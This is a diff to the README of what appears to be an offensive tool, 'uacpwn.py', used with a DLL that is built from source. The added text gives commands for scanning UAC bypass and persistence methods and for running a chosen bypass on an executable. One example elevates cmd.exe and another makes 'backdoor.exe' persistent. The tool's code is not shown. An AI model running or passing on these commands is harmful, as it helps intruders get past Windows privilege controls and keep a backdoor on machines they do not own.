@@ -64,3 +64,44 @@ cl /LD /O2 myuac.cpp /Fe:dll/myuac.dll /link shell32.lib advapi32.lib ole32.lib
 g++ -shared -O2 -o myuac.dll dll/myuac.cpp -lshell32 -ladvapi32 -lole32
 ```
 
+## Python Wrapper Setup
+
+```
+pip install colorama tabulate
+```
+
+### Scanning Mode
+
+```
+# Scan UAC Bypass Methods:
+
+python uacpwn.py --scan
+```
+
+### Scan Persistence Techniques:
+
+```
+python uacpwn.py --scan-per
+```
+
+#⚡ Exploitation Mode
+
+```
+# Execute UAC Bypass:
+
+python uacpwn.py -m <method_id> <path_to_executable>
+```
+
+# Example:
+
+```
+python uacpwn.py -m 2 C:\Windows\System32\cmd.exe
+```
+
+## Execute UAC Bypass
+
+```
+python uacpwn.py -p <method_id> <path_to_executable>
+# Example:
+python uacpwn.py -p 5 C:\Tools\backdoor.exe
+```
